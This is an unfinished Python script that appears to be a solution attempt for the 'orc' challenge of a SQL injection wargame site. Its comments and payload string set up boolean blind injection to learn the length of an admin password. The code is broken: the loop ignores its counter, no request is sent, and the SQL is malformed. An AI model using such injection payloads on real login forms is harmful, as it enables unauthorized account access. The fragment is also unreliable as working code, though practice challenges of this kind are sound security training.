import requests

# Enumerate the password length, Boolean Blind Based Sqli
# Query = select id from prob_orc where id='admin' and pw='' OR 1=1 --+'
# URL = 'https://los.rubiya.kr/chall/orc_60e5b360f95c1f9688e4f3a86c5dd494.php'

url = 'https://los.rubiya.kr/chall/orc_60e5b360f95c1f9688e4f3a86c5dd494.php';


# Get the length of the password
for i in range(20):
    payload = "' or select (length((select pw from prob_id limit 0,1))=8); --+"    